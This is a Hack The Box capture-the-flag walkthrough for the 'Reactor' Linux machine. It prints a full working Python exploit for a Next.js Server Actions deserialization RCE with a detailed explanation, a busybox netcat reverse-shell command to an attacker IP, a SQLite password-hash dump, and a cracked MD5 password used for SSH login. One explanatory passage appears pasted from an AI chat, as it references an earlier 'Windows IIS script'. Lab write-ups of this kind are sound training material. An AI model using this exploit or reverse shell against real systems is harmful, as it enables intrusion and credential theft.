# Reactor

> **Difficulty:** Medium  
> **Platform:** Hack The Box  
> **Operating System:** Linux

---

# Overview

Reactor is a Linux machine centered around a modern **Next.js** application.

The initial foothold is achieved by exploiting a vulnerable **React Server Component (RSC)** endpoint, resulting in remote command execution as the **node** user.

Post-exploitation involves inspecting the application source code, extracting credentials from a local SQLite database, cracking an MD5 password hash, and authenticating via SSH as the **engineer** user.

Privilege escalation is then achieved by abusing the vulnerable Node.js application running as root, ultimately leading to full system compromise.

---

# Enumeration

A full TCP scan identified two accessible services.

```bash
nmap -sC -sV -oN nmap_scan <TARGET-IP>
```

### Open Ports

| Port | Service | Version |
|------|---------|---------|
|22|SSH|OpenSSH 9.6p1|
|3000|HTTP|Next.js Application|

> 📷 **Screenshot**

![Nmap Scan](Images/nmap_scan.png)

---

# Web Enumeration

Browsing to port **3000** revealed a monitoring dashboard named **ReactorWatch**.

The application appeared to be built using **Next.js**, confirmed by both HTTP response headers and exposed JavaScript assets.

Interesting observations included:

- Next.js framework
- React Server Components
- Modern JavaScript frontend
- Dynamic API responses

> 📷 **Screenshot**

![Web Application](Images/webserver.png)

---

# Initial Foothold

Research into the application's behavior identified a vulnerable **Next.js Server Action** endpoint susceptible to server-side code execution.

```python
# /// script
# dependencies = ["requests"]
# ///
import requests
import sys
import json

BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"
EXECUTABLE = sys.argv[2] if len(sys.argv) > 2 else "id"

crafted_chunk = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then": "$B0"}',
    "_response": {
        "_prefix": f"var res = process.mainModule.require('child_process').execSync('{EXECUTABLE}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});",
        # If you don't need the command output, you can use this line instead:
        # "_prefix": f"process.mainModule.require('child_process').execSync('{EXECUTABLE}');",
        "_formData": {
            "get": "$1:constructor:constructor",
        },
    },
}

files = {
    "0": (None, json.dumps(crafted_chunk)),
    "1": (None, '"$@0"'),
}

headers = {"Next-Action": "x"}
res = requests.post(BASE_URL, files=files, headers=headers, timeout=10)
print(res.status_code)
print(res.text)
```

This script is a Proof of Concept (PoC) exploit designed to achieve Remote Code Execution (RCE) on a web server running a vulnerable version of Next.js (specifically targeting how Next.js handles React Server Components and Server Actions).

Like the Windows IIS script you looked at earlier, the ultimate goal here is to force the remote server to run an arbitrary system command—by default, the Linux command id (which prints the user identity of the running server process).

Here is a step-by-step breakdown of how this modern web exploit works from the ground up.

> 1. The Setup & Arguments
```Python
# dependencies = ["requests"]
import requests
import sys
import json

BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"
EXECUTABLE = sys.argv[2] if len(sys.argv) > 2 else "id"
```

> PEP 723 Metadata: The top comments (# /// script...) tell modern Python tools (like uv or pipx) to automatically install the requests library before running the script.

> Command-Line Arguments: The script looks at how you ran it from the terminal:

> sys.argv[1] sets the target URL (defaulting to http://localhost:3000, the standard local port for Next.js developers).

> sys.argv[2] sets the system command to execute (defaulting to id, a standard, harmless Linux command used by researchers to prove read access to system execution).

> 2. The Delivery Mechanism (Server Actions)
```Python
files = {
    "0": (None, json.dumps(crafted_chunk)),
    "1": (None, '"$@0"'),
}
headers = {"Next-Action": "x"}
res = requests.post(BASE_URL, files=files, headers=headers, timeout=10)
```
> To understand the attack vector, you have to know a little about how Next.js Server Actions work:

> When a user interacts with a modern Next.js application (like submitting a form), the browser sends an HTTP POST request to the server with a special header called Next-Action.

> The data is sent in a specialized streaming format (the "Flight" protocol) using numbered chunks ("0", "1").

> The script mimics this exact behavior by setting "Next-Action": "x" and sending two form-data chunks, tricking the server into parsing the payload as a legitimate internal state update.

> 3. The Core Vulnerability: Deserialization & Prototype Pollution
> The magic happens inside the crafted_chunk dictionary. This payload exploits a vulnerability in how the Node.js backend deserializes (unpacks) the incoming Flight data stream:

```Python
crafted_chunk = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then": "$B0"}',
    ...
```
> The JavaScript Engine Tricks
> Prototype Pollution (__proto__): In JavaScript, almost every object inherits properties from a blueprint called a "prototype." By injecting the string "$1:__proto__:then", the attacker forces the server's data-parser to climb up the inheritance chain and modify internal object structures that should be read-only.

> Constructor Abuse ($1:constructor:constructor): In JavaScript, an object's constructor points to the function that created it. By chaining .constructor.constructor, an attacker can reach the global Function constructor—which allows them to take raw text strings and compile them into executable JavaScript code on the fly.

> Fake Promises (then, resolved_model): Next.js uses asynchronous Promises to handle streaming data. By naming properties then and setting the status to resolved_model, the payload tricks the framework into thinking this malicious object is a completed internal task, forcing the server to evaluate the code inside.

> 4. The Payload: Hijacking Node.js
> Once the JavaScript engine is tricked into compiling text into executable code, it runs the string located in _prefix:

```Python
"_prefix": f"var res = process.mainModule.require('child_process').execSync('{EXECUTABLE}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});"
Here is what that JavaScript command actually does on the backend server:

process.mainModule.require('child_process'): It accesses Node.js's internal system modules and imports child_process, which is the module responsible for interacting directly with the underlying operating system.

.execSync('{EXECUTABLE}'): It runs the system command you specified earlier (like id or whoami) directly on the server's command line and waits for it to finish.

throw Object.assign(new Error('NEXT_REDIRECT'), {digest: ${res}});: This is a clever exfiltration trick. In Next.js, when a Server Action redirects a user, it throws a specific error called NEXT_REDIRECT containing a digest string. The script takes the terminal output of the command (e.g., uid=1000(user)...), stuffs it inside a fake redirect error, and throws it.
```
> The Result: Because the server thinks this is a normal redirect error, it packages the command's terminal output into the HTTP response (res.text) and sends it right back to the attacker's terminal screen!


A public proof-of-concept was modified to execute arbitrary system commands.

The exploit sends a crafted React Server Component payload that abuses JavaScript's constructor chain to invoke:

```javascript
require('child_process').execSync()
```

The exploit script was executed as follows:

```bash
python script.py http://<TARGET-IP>:3000 \
"busybox nc <ATTACKER-IP> 4444 -e /bin/sh"
```

A Netcat listener was started beforehand.

```bash
nc -lvnp 4444
```

Shortly afterwards, a reverse shell connected back as the **node** user.

```bash
whoami
```

Output:

```text
node
```

> 📷 **Screenshot**

![Reverse Shell](Images/nc-success.png)

---

# Local Enumeration

The application directory was inspected.

```bash
cd /home/engineer/app

ls
```

Interesting files included:

- package.json
- next.config.js
- reactor.db

The SQLite database appeared to contain user information.

```
reactor.db
```

Using SQLite, the users table was queried.

```bash
sqlite3 reactor.db

SELECT * FROM users;
```

The database returned two users:

- administrator
- engineer

along with password hashes.

> 📷 **Screenshot**

![Database Credentials](Images/cred-hashed.png)

---

# Credential Recovery

The engineer account password hash was extracted and identified as an MD5 hash.

The hash was successfully cracked.

```
39d97110eafe2a9a68639812cd271e8e
```

Recovered password:

```
reactor1
```

> 📷 **Screenshot**

![Hash Cracked](Images/hash-cracked.png)

---

# SSH Access

The recovered credentials were used to authenticate via SSH.

```bash
ssh engineer@<TARGET-IP>
```

Authentication succeeded, providing a stable shell as the **engineer** user.

```bash
whoami
```

Output:

```text
engineer
```

The user flag was then captured.

> 📷 **Screenshot**

![Engineer Shell](Images/engineer-ssh.png)
